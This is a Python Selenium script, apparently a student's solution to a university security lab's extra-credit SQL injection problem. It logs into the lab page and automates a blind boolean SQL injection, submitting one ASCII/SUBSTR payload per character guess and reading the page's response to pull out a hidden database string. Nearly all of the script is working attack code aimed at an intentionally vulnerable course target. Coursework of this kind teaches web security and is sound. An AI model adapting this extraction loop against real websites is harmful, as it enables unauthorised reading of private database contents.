from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.firefox.service import Service as FirefoxService
from webdriver_manager.firefox import GeckoDriverManager
from selenium.webdriver.support.wait import WebDriverWait
from time import sleep

driver = webdriver.Firefox(service=FirefoxService(GeckoDriverManager().install()))

# login page
driver.get("https://cse484.cs.washington.edu/lab2/jailbreak/undefeatableboss.php")
group_input = driver.find_element(by=By.NAME, value="groups")
pass_input = driver.find_element(by=By.NAME, value="password")

group_input.send_keys("SecureGroupName")
pass_input.send_keys("SuperSecurePassword")
pass_input.send_keys(Keys.ENTER)

# menu page
driver.implicitly_wait(3)
sleep(1)

prob3 = driver.find_element(by=By.XPATH, value="//button[contains(text(),'Problem 3 (Extra Credit)')]")
prob3.click()

# part 3 page
# commands = ["') and false; --","') and true; --"]
string_length = 13
s = []
for i in range(1,string_length+1):
    # usable characters, can drop down to 32 if there are numbers/symbols
    for j in range(97,128):
        command = f"') and ASCII(SUBSTR((SELECT whatyoucanreallydo FROM `sql3-truepower`),{i},1))={j}; --"
        print(command)
        input_box = driver.find_element(by=By.NAME, value="command")
        input_box.send_keys(command)
        input_box.send_keys(Keys.ENTER)
        sleep(0.5)
        response_box = driver.find_elements(by=By.TAG_NAME, value="p")[1]
        print(response_box.text)
        if (response_box.text.startswith("Command \"') and")):
            s.append(chr(j))
            print('found letter! ' + chr(j))
            break
        # sleep(0.5)

print(s)
driver.quit()